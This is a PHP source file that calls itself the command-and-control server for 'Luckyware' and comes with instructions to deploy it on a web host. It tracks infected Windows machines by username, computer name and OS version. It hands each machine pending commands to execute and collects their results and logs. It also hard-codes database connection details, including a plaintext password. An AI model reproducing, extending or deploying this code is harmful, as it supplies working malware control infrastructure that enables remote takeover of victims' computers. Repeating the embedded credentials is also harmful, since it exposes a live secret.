<?php
// Luckyware C&C Server API
// Upload this to your Render web service

header('Content-Type: text/plain');
error_reporting(0);

// Database configuration - PostgreSQL (Supabase Connection Pooler - Transaction Mode)
// Using IPv4 pooler for Render compatibility
$db_host = 'aws-0-us-east-1.pooler.supabase.com';
$db_name = 'postgres';
$db_user = 'postgres.mljxejdqoxraqimxjhnn';
$db_pass = 'Palette1853141!';
$db_port = 6543;  // Pooler port (NOT 5432)

// Connect to database - PostgreSQL PDO
try {
    $conn = new PDO("pgsql:host=$db_host;port=$db_port;dbname=$db_name", $db_user, $db_pass);
    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch(PDOException $e) {
    die("db_error");
}

// Get action
$action = isset($_GET['action']) ? $_GET['action'] : '';

// Get POST data
$client_id = isset($_POST['client_id']) ? $_POST['client_id'] : '';

switch($action) {
    case 'register':
        // Register new client
        $username = isset($_POST['username']) ? $_POST['username'] : 'Unknown';
        $computer_name = isset($_POST['computer_name']) ? $_POST['computer_name'] : 'Unknown';
        $windows_version = isset($_POST['windows_version']) ? $_POST['windows_version'] : 'Unknown';
        
        // Check if client already exists
        $stmt = $conn->prepare("SELECT id FROM clients WHERE client_id = ?");
        $stmt->execute([$client_id]);
        
        if($stmt->rowCount() == 0) {
            // Insert new client
            $stmt = $conn->prepare("INSERT INTO clients (client_id, username, computer_name, windows_version, first_seen, last_seen, status) VALUES (?, ?, ?, ?, NOW(), NOW(), 'online')");
            $stmt->execute([$client_id, $username, $computer_name, $windows_version]);
            echo "success:registered";
        } else {
            // Update existing client
            $stmt = $conn->prepare("UPDATE clients SET last_seen = NOW(), status = 'online' WHERE client_id = ?");
            $stmt->execute([$client_id]);
            echo "success:updated";
        }
        break;
        
    case 'heartbeat':
        // Update last seen
        if(!empty($client_id)) {
            $stmt = $conn->prepare("UPDATE clients SET last_seen = NOW(), status = 'online' WHERE client_id = ?");
            $stmt->execute([$client_id]);
            echo "success:heartbeat";
        }
        break;
        
    case 'get_commands':
        // Get pending commands for this client
        if(!empty($client_id)) {
            $stmt = $conn->prepare("SELECT id, command_type, command_data FROM commands WHERE client_id = ? AND status = 'pending' ORDER BY created_at ASC LIMIT 1");
            $stmt->execute([$client_id]);
            
            if($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
                // Mark command as executing
                $stmt2 = $conn->prepare("UPDATE commands SET status = 'executing', executed_at = NOW() WHERE id = ?");
                $stmt2->execute([$row['id']]);
                
                // Return command in format: command_id|command_type|command_data
                echo $row['id'] . '|' . $row['command_type'] . '|' . $row['command_data'];
            } else {
                echo "no_commands";
            }
        }
        break;
        
    case 'submit_result':
        // Submit command result
        $command_id = isset($_POST['command_id']) ? intval($_POST['command_id']) : 0;
        $result_data = isset($_POST['result']) ? $_POST['result'] : '';
        
        if($command_id > 0) {
            $stmt = $conn->prepare("UPDATE commands SET status = 'completed', result = ? WHERE id = ?");
            $stmt->execute([$result_data, $command_id]);
            echo "success:result_submitted";
        }
        break;
        
    case 'submit_log':
        // Submit log entry
        $log_type = isset($_POST['log_type']) ? $_POST['log_type'] : 'info';
        $message = isset($_POST['message']) ? $_POST['message'] : '';
        
        if(!empty($client_id) && !empty($message)) {
            $stmt = $conn->prepare("INSERT INTO logs (client_id, log_type, message, created_at) VALUES (?, ?, ?, NOW())");
            $stmt->execute([$client_id, $log_type, $message]);
            echo "success:log_submitted";
        }
        break;
        
    default:
        echo "invalid_action";
        break;
}

$conn = null;
?>
